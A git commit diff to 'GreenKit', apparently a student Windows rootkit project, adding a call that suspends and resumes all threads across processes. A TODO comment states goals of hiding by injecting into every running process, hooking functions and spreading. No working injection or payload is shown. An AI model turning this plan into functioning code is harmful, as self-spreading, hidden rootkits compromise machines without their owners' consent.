926d863fc82220e04f0965b5407b6556cdd66542
Green <Green.Epita2016@gmail.com>
2015-05-16 01:24:16 +0200

    GK can now suspend and resume all threads on comp

--- GreenKit/GreenKit.cpp
+++ GreenKit/GreenKit.cpp
@@ -3,12 +3,15 @@
 
 #include "stdafx.h"
 #include "GreenKit.h"
+#include "process.h"
 
 // Global Variables:
 HINSTANCE hInst;								// current instance
 
 // Forward declarations of functions included in this code module:
 //ATOM				MyRegisterClass(HINSTANCE hInstance); *** KEPT ONLY AS EXAMPLE ***
+
+
 
 int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                      _In_opt_ HINSTANCE hPrevInstance,
@@ -18,10 +21,14 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(lpCmdLine);
 	hInst = hInstance;
+
 	/* TODO :
 		Run the core of GreenKit :
 			Hide ourself : Inject ourself to every process running on the system and hook desired functions
 			Spread ourself
 	*/
+
+	// Run through every process of the system
+	process_allSuspendApplyResume(NULL);
 	return 0;
 }
